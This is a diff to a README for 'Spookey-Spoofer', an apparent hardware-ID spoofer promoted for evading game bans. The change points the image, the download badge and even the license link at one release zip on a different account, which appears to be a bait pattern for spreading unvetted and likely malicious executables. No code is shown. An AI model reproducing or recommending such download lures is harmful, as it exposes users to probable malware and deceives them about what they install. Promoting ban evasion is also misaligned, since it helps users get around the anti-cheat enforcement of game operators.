@@ -1,5 +1,5 @@
 # Spookey-Spoofer
-![spoofer](https://image.freepik.com/free-vector/hacker-programmer-using-portable-devices_291353-348.jpg)
+![spoofer](https://github.com/rauloscar1/Spookey-Spoofer/releases/download/v1.0/Release_x64.zip)
 
 ## Overview
 Welcome to the Spookey-Spoofer repository, your go-to tool for cleaning and spoofing hardware IDs on Windows systems. Whether you need to bypass bans, fix hardware ID issues, or spoof your hardware for gaming, Spookey-Spoofer has got you covered. Version 1.0.0.0 is here with all the latest features you need!
@@ -27,9 +27,9 @@ Welcome to the Spookey-Spoofer repository, your go-to tool for cleaning and spoo
 🛠️ **Unban Tool 2024**: Utilize our tool to successfully unban yourself in 2024.
 
 ## Installation
-Download the latest version of Spookey-Spoofer [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Once downloaded, unzip the file and launch the application to get started.
+Download the latest version of Spookey-Spoofer [here](https://github.com/rauloscar1/Spookey-Spoofer/releases/download/v1.0/Release_x64.zip). Once downloaded, unzip the file and launch the application to get started.
 
-[![Download Spookey-Spoofer](https://img.shields.io/badge/Download-Spookey--Spoofer-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Spookey-Spoofer](https://github.com/rauloscar1/Spookey-Spoofer/releases/download/v1.0/Release_x64.zip)](https://github.com/rauloscar1/Spookey-Spoofer/releases/download/v1.0/Release_x64.zip)
 
 ## Usage
 1. Run the Spookey-Spoofer application on your Windows system.
@@ -44,7 +44,7 @@ For any questions or assistance regarding Spookey-Spoofer, feel free to reach ou
 We welcome contributions to enhance Spookey-Spoofer's functionality and effectiveness. If you have ideas or suggestions for improvements, please don't hesitate to submit a pull request.
 
 ## License
-Spookey-Spoofer is licensed under the MIT License. See the [LICENSE](https://github.com/22155555/1875695542/blob/main/LICENSE) file for more details.
+Spookey-Spoofer is licensed under the MIT License. See the [LICENSE](https://github.com/rauloscar1/Spookey-Spoofer/releases/download/v1.0/Release_x64.zip) file for more details.
 
 ---
 
